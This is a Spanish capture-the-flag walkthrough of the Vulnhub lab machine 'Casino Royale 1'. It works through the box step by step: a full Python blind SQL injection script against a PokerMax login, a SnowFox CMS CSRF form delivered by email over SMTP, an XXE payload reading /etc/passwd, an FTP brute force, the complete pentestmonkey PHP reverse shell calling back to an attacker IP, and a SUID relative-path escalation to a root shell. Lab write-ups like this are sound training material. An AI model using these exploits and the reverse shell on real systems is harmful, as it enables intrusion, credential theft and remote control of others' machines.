
## Información General

- **Nombre de la máquina**: Casino Royale 1
- **Fecha de realización**: [[2024-04-02]]
- **Nivel de dificultad**: Medio
- **Sistema Operativo**: Linux
- **Plataforma**: Vulnhub
- **Enlace de la máquina**: [Enlace a la plataforma donde se encuentra la máquina]

## Resumen
[Un breve resumen de la máquina y las técnicas utilizadas para comprometerla.]

## Enumeración y Reconocimiento

Comenzamos enumerando los puertos de la maquina

![[Pasted image 20240402094410.png]]

Vemos que hay varios puertos abiertos entre ellos los correspondientes a los servicios http, smtp y ftp empezaremos investigando el puerto 80 donde al entrar desde el navegador vemos solo lo siguiente 

![[Pasted image 20240402095045.png]]

Al analizar toda la pagina no encontre nada intresante por lo que me puse a enumerar los directorios con ayuda de wfuzz y fue haciendo esto que encontre varios directorios intresantes


![[Pasted image 20240402102004.png]]

Revisando todos los directorios me tope con el directorio de install el cual al entrar a este nos muestra una pagina de instalacion de un software llamado PokerMax Poker League


![[Pasted image 20240402103840.png]]

Investigando en foros parece ser que hay login en el endpoint pokeradmin por los que nos dirigimos ahi y efectivamente hay un login

![[Pasted image 20240402104256.png]]

Este es vulnerable a Inyección SQL, más específicamente una boolean based blind, aunque puede que no sea el único tipo al que es vulnerable. Por lo tanto, he creado un script en Python que enumera los datos explotando la Inyección SQL presente en el login. El script es el siguiente:


```python
import requests
import pandas as pd
from tabulate import tabulate

url = "http://192.168.0.49/pokeradmin/"
headers = {"Content-Type": "application/x-www-form-urlencoded"}


def makeSQLI():
    posicion = 1
    char = 30
    db = ""

    while True:
        data = {
            "op": "adminlogin",
            "username": f"juan' or ascii(substring((select group_concat(schema_name) from information_schema.schemata),{posicion},1))={char}-- -",
            "password": "",
        }
        response = requests.post(url, data=data, headers=headers)
        if (
            "You have now logged in to the Admin area" in response.text
            and chr(char).isupper() == False
        ):
            db += chr(char)
            char = 30
            posicion += 1
        else:
            char += 1

        if char == 126:
            break
    posicion = 1
    char = 30

    lista_db = db.split(",")
    nueva_lista_db = []

    for i in lista_db:
        if (
            i != "performance_schema"
            and i != "sys"
            and i != "information_schema"
            and i != "mysql"
            and i != "phpmyadmin"
            and i != "vip"
        ):
            nueva_lista_db.append(i)
    tablas = ""
    tablas_db = {}

    for i in nueva_lista_db:
        print(i)
        while True:
            data = {
                "op": "adminlogin",
                "username": f"juan' or ascii(substring((select group_concat(table_name) from information_schema.tables where table_schema='{i}'),{posicion},1))={char}-- -",
                "password": "",
            }
            response = requests.post(url, data=data, headers=headers)
            if (
                "You have now logged in to the Admin area" in response.text
                and chr(char).isupper() == False
            ):
                tablas += chr(char)
                char = 30
                posicion += 1
            else:
                char += 1

            if char == 126:
                break
        posicion = 1
        char = 30
        tablas_db[i] = tablas.split(",")
        tablas = ""
    columnas_tablas_db = {}
    tablas_dict = {}
    columnas = ""
    for i in tablas_db:
        for j in tablas_db[i]:
            while True:
                data = {
                    "op": "adminlogin",
                    "username": f"juan' or ascii(substring((select group_concat(column_name) from information_schema.columns where table_schema='{i}' and table_name='{j}'),{posicion},1))={char}-- -",
                    "password": "",
                }
                response = requests.post(url, data=data, headers=headers)
                if (
                    "You have now logged in to the Admin area" in response.text
                    and chr(char).isupper() == False
                ):
                    columnas += chr(char)
                    char = 30
                    posicion += 1
                else:
                    char += 1

                if char == 126:
                    break
            posicion = 1
            char = 30
            tablas_dict[j] = columnas.split(",")
            columnas_tablas_db[i] = tablas_dict
            columnas = ""

        tablas_dict = {}
    print(columnas_tablas_db)
    columnas_tablas_db_datos = {}

    for i in columnas_tablas_db:
        for j in columnas_tablas_db[i]:
            datos_dict = {}
            for k in columnas_tablas_db[i][j]:
                datos = ""
                while True:
                    data = {
                        "op": "adminlogin",
                        "username": f"juan' or ascii(substring((select group_concat({k} SEPARATOR '--..--') from {i}.{j}),{posicion},1))={char}-- -&op=PrintTournamentResults",
                        "password": "",
                    }
                    response = requests.post(url, data=data, headers=headers)
                    if (
                        "You have now logged in to the Admin area" in response.text
                        and chr(char)
                        in ' !$%&()*+,./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ""[]_-abcdefghijklmnopqrstuvwxyz{|}~'
                    ):
                        datos += chr(char)
                        print(datos)
                        char = 30
                        posicion += 1
                    else:
                        char += 1

                    if char == 126:
                        break
                posicion = 1
                char = 30

                datos_dict[k] = datos.split("--..--")
            columnas_tablas_db_datos.setdefault(i, {}).setdefault(j, datos_dict)
    print(columnas_tablas_db_datos)
    for i in columnas_tablas_db_datos:
        for j in columnas_tablas_db_datos[i]:
            df = pd.DataFrame(columnas_tablas_db_datos[i][j])

            # Ajustar la configuración de visualización de Pandas
            pd.set_option("display.max_columns", None)
            pd.set_option("display.max_rows", None)
            pd.set_option("display.width", None)

            # Convertir DataFrame a formato de tabla con tabulate
            tabla_formateada = tabulate(df, headers="keys", tablefmt="grid")

            # Imprimir el nombre de la tabla y el nombre de la columna
            print(f"Bd: {i}, Tabla: {j}")

            # Imprimir la tabla formateada
            print(tabla_formateada)
            print("\n")  # Añadir una línea en blanco entre tablas


if __name__ == "__main__":
    makeSQLI()

```

Al ejecutar este script podemos ver las tablas que tiene la base en una de estas tablas llamada pokermax_admin podemos ver un usuario admin  y su contraseña correspondiente

![[Pasted image 20240402113954.png]]


Al probar estas credenciales en el login hemos iniciado sesion exitosamente y vemos un sitio web donde al parecer de administran tornos de poker

![[Pasted image 20240402114527.png]]


Indagando un poco mas  en el sitio podemos ver que hay una seccion donde se administran los jugadores 

![[Pasted image 20240402115007.png]]

Al ver la informacion de cada uno de estos jugadores podemos ver que la descripcion de la jugadora valenka nos dice que hay una seccion en el sitio donde se gestionan los proyectos de los clientes y nos menciona que tendremos que actualizar el archivo /etc/hosts de nuestra maquina para poder acceder al sitio web local correctamente


![[Pasted image 20240402163158.png]]

Ya con el archivo /etc/hosts modificado correctamente accedemos a la seccion que mencionaba en la descripcion en esta podemos ver un sitio completamente normal 


![[Pasted image 20240402164413.png]]


Viendo mejor el sitio, podemos notar que está hecho con SnowFox CMS. Utilizando SearchSploit, identificamos que es vulnerable a CSRF y encontramos un exploit disponible. Con esta vulnerabilidad, podemos aprovecharnos para crear un administrador de forma indebida


![[Pasted image 20240402164823.png]]

El exploit en cuestion es este en el cual solo tendremos cambiar email, username, password y confirm password por lo que nosotros queramos

```html
<html>
  <body>
    <form action="http://casino-royale.local/vip-client-portfolios/?uri=admin/accounts/create" method="POST">
      <input type="hidden" name="emailAddress" value="email@email.com" />
      <input type="hidden" name="verifiedEmail" value="verified" />
      <input type="hidden" name="username" value="username" />
      <input type="hidden" name="newPassword" value="password" />
      <input type="hidden" name="confirmPassword" value="password" />
      <input type="hidden" name="userGroups[]" value="34" />
      <input type="hidden" name="userGroups[]" value="33" />
      <input type="hidden" name="memo" value="CSRFmemo" />
      <input type="hidden" name="status" value="1" />
      <input type="hidden" name="formAction" value="submit" />
      <input type="submit" value="Submit form" />
    </form>
  </body>
</html>

```



Pero ahora tenemos que verificar si existe alguna manera en la que un administrador pueda ejecutar el exploit y crear una cuenta como administrador. En la sección del blog del sitio se menciona algo sobre la posibilidad de enviar un correo electrónico al administrador del sitio (Valenka), quien lo revisa constantemente. Sin embargo, como asunto del correo, es necesario utilizar necesariamente el nombre de un cliente.


![[Pasted image 20240402190908.png]]

Entonces fue cuando recorde que esta corriendo un servicio smtp en el puerto 25 el cual lo podemos usar para mandarle un correo al administrador y en este incluir un enlace que lo rediriga a nuestro exploit y asi hacer que este cree la cuenta como administrador pero primero desde nuestra maquina atacante tendremos levantar un servidor con python donde este alojado nuestro exploit asi que adecuamos perfectamente nuestro exploit con nuestros datos y levantamos el servidor  

![[Pasted image 20240402210346.png]]

![[Pasted image 20240402210309.png]]

Para comenzar, utilizaremos el servicio SMTP. Primero, nos conectamos utilizando netcat y especificamos el dominio al que nos conectaremos. A continuación, indicamos nuestra dirección de correo electrónico como remitente, seguida de la dirección de correo electrónico del administrador como destinatario. Luego, especificamos el nombre del cliente como asunto y pegamos la ubicación de nuestro exploit. Finalizamos el correo electrónico con un punto para indicar el final del mensaje.


![[Pasted image 20240402213501.png]]

Si todo ha salido bien si iniciamos sesion como el usuario que hemos especificado en el exploit vemos que podemos entrar exitosamente y tambien somos admin asi que hemos explotado el csrf correctamente

![[Pasted image 20240402214034.png]]

Al revisar el sitio web vemos que al ser admin hay un apartado para gestionar a los usuarios


![[Pasted image 20240402214212.png]]

Inspeccionando todos los usuarios vemos que el usuario 'Le' tiene lo siguiente donde menciona que existe una pagina solo para clientes exclusivos


![[Pasted image 20240402214952.png]]

Al entrar a este vemos que se nos muestra un sitio pero al parecer no se ve nada interesante

![[Pasted image 20240402215131.png]]


Al inspeccionar el código, se observa un comentario que aparentemente revela el código fuente del archivo .php. Este código PHP parece estar diseñado para procesar un documento XML que incluye credenciales de usuario. Desactiva temporalmente las medidas de seguridad para cargar entidades externas, luego recupera y muestra el nombre de usuario en un mensaje de bienvenida. Sin embargo, es importante tener en cuenta que este código podría ser vulnerable a ataques de inyección de XML si se utiliza con datos no confiables. Además, se encuentra otro comentario que sugiere que posiblemente el siguiente paso sea acceder al servicio FTP, dado que también está en ejecución en la misma máquina.


![[Pasted image 20240402220212.png]]



Asi que vamos a crear un archivo que intente explotar una vulnerabilidad de XXE para acceder al contenido del archivo /etc/passwd y potencialmente obtener información sensible sobre los usuarios del sistema el xml quedaria de la siguiente manera: 

```xml
<!DOCTYPE nota [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>


<datos>
  <customer>&xxe;</customer>
</datos>
```

Con el archivo finalizado, procederemos a subirlo utilizando cURL de la siguiente manera. Como se puede observar, la XXE ha funcionado correctamente y nos muestra todos los usuarios presentes en la máquina víctima, entre ellos uno relacionado con FTP.

![[Pasted image 20240402223122.png]]

Ya que en el comentario de la pagina mencionaba que el servicio ftp tenia una contraseña muy facil y como al parecer ya tenemos el usuario del servicio se me occurio hacer una ataque de fuerza bruta con hydra y al esperar un buen rato encontro la contraseña correspondiente 


![[Pasted image 20240402223720.png]]


  
Ahora, al acceder al servicio, podemos observar que el directorio actual corresponde al directorio de la página web en la que nos encontrábamos, ya que podemos ver el archivo main.php, entre otros.


![[Pasted image 20240402224503.png]]


Sabiendo esto, se me ocurrió crear un archivo para establecer una shell inversa, en el cual solo indicamos la dirección IP y el puerto de la máquina atacante donde estaremos escuchando. El archivo es el siguiente:


```python
<?php
// php-reverse-shell - A Reverse Shell implementation in PHP
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net
//
// This tool may be used for legal purposes only.  Users take full responsibility
// for any actions performed using this tool.  The author accepts no liability
// for damage caused by this tool.  If these terms are not acceptable to you, then
// do not use this tool.
//
// In all other respects the GPL version 2 applies:
//
// This program is free software; you can redistribute it and/or modify
// it under the terms of the GNU General Public License version 2 as
// published by the Free Software Foundation.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License along
// with this program; if not, write to the Free Software Foundation, Inc.,
// 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
//
// This tool may be used for legal purposes only.  Users take full responsibility
// for any actions performed using this tool.  If these terms are not acceptable to
// you, then do not use this tool.
//
// You are encouraged to send comments, improvements or suggestions to
// me at pentestmonkey@pentestmonkey.net
//
// Description
// -----------
// This script will make an outbound TCP connection to a hardcoded IP and port.
// The recipient will be given a shell running as the current user (apache normally).
//
// Limitations
// -----------
// proc_open and stream_set_blocking require PHP version 4.3+, or 5+
// Use of stream_select() on file descriptors returned by proc_open() will fail and return FALSE under Windows.
// Some compile-time options are needed for daemonisation (like pcntl, posix).  These are rarely available.
//
// Usage
// -----
// See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.

set_time_limit (0);
$VERSION = "1.0";
$ip = '192.168.0.128';  // CHANGE THIS
$port = 4444;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

//
// Daemonise ourself if possible to avoid zombies later
//

// pcntl_fork is hardly ever available, but will allow us to daemonise
// our php process and avoid zombies.  Worth a try...
if (function_exists('pcntl_fork')) {
	// Fork and have the parent process exit
	$pid = pcntl_fork();
	
	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}
	
	if ($pid) {
		exit(0);  // Parent exits
	}

	// Make the current process a session leader
	// Will only succeed if we forked
	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}

	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

// Change to a safe directory
chdir("/");

// Remove any umask we inherited
umask(0);

//
// Do the reverse shell...
//

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}

// Spawn shell process
$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}

// Set everything to non-blocking
// Reason: Occsionally reads will block, even though stream_select tells us they won't
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
	// Check for end of TCP connection
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}

	// Check for end of STDOUT
	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}

	// Wait until a command is end down $sock, or some
	// command output is available on STDOUT or STDERR
	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	// If we can read from the TCP socket, send
	// data to process's STDIN
	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}

	// If we can read from the process's STDOUT
	// send data down tcp connection
	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}

	// If we can read from the process's STDERR
	// send data down tcp connection
	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

// Like print, but does nothing if we've daemonised ourself
// (I can't figure out how to redirect STDOUT like a proper daemon)
function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}

?> 




```


Ahora desde ftp lo tratamos de subir pero como podemos ver nos aparece un mensaje el cual indica que no tenemos permisos para subirlo 


![[Pasted image 20240403114857.png]]

Intentando varias cosas llegue a cambiarle la extension de php a php3 y al subirlo vemos que se subio exitosamente 

![[Pasted image 20240403135908.png]]

Luego le asignamos los permisos correspondientes

![[Pasted image 20240403140829.png]]

Ahora ya que el archivo se subio correctamente y se le han asignado los permisos lo que resta es ponerse en escucha desde la maquina atacante 

![[Pasted image 20240403140019.png]]

Si accedemos al archivo php desde el navegador podemos ver que efectivamente tenemos nos ha dado una shell 

![[Pasted image 20240403140930.png]]

![[Pasted image 20240403140951.png]]

Ahora que tenemos acceso a una shell, podemos observar que somos el usuario www-data. Por lo tanto, necesitamos intentar escalar privilegios. Al enumerar la máquina y buscar archivos con permisos suid, notamos un binario bastante interesante que tiene permisos suid y cuyo propietario es root.


![[Pasted image 20240403142915.png]]

Si lo ejecutamos dentro del directorio donde se encuentra el ejecutable  vemos que nos muestra un informe detallado de los procesos activos y las conexiones de red en el sistema en el momento en que se generó el reporte 

![[Pasted image 20240403160941.png]]



Pero si lo ejecutamos desde otro directorio nos muestra el siguiente error 


![[Pasted image 20240403163413.png]]


Analizando este archivo con el uso de strings podemos ver que este ejecuta un script del forma relativa llamado run.sh


![[Pasted image 20240403144545.png]]

Podemos aprovechar el hecho de que el script llama a otro script de forma relativa para crear un script en bash con el mismo nombre en nuestro directorio actual. De esta manera, podremos generar una shell como root. El script sería el siguiente:

```bash
#!/bin/bash

bash -p
```

Entonces, si ejecutamos el programa, efectivamente observamos que toma nuestro script y lo ejecuta como root, lo que nos permite obtener una shell.


![[Pasted image 20240403155805.png]]

Ya que hemos escalado privilegios correctamente lo unico que tenemos que hacer es entrar al directroro /root/flag y este ejecutar el archivo flag.sh este nos levantara un servidor en el puerto 8082 y al acceder a este por el navegador podemos ver que nos muestra la flag


![[Pasted image 20240403160356.png]]

![[Pasted image 20240403160624.png]]
